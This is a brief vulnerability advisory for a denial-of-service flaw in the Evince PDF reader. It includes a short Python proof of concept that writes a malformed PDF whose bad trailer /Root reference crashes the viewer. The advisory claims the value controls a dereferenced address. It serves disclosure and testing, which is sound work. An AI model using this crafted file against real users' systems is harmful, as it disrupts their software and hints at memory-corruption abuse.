@@ -1,0 +1,37 @@
+Advisory Information :
+======================
+Title : Evince 2.32.0.145 - Denial Of Service
+Product : Evince pdf reader
+Vendor Homepage: https://projects.gnome.org/evince/
+Vulnerable Version(s) : Windows 2.32.0.145, Linux 3.4.0 and probably prior release
+Tested Version : Windows 2.32.0.145, Linux 3.4.0
+Tested On : Windows 7 & 8, Ubuntu 13.04
+Discovered By : Deva, Securimag Team
+ 
+Introduction :
+==============
+Evince is a document viewer for multiple document formats. 
+The goal of evince is to replace the multiple document viewers that exist on the GNOME Desktop with a single simple application.
+ 
+- Copied from : https://projects.gnome.org/evince/
+
+Proof Of Concept :
+==================
+You can control dereferenced address by changing value of /Root (here 42)
+
+#!/usr/bin/python
+
+pdf = """trailer
+<<
+/Size 1337
+/Root 42 0 R
+>>
+startxref
+1
+%%EOF
+"""
+ 
+filename = "EvincePoC.pdf"
+file = open(filename,"w")
+file.writelines(pdf)
+file.close()
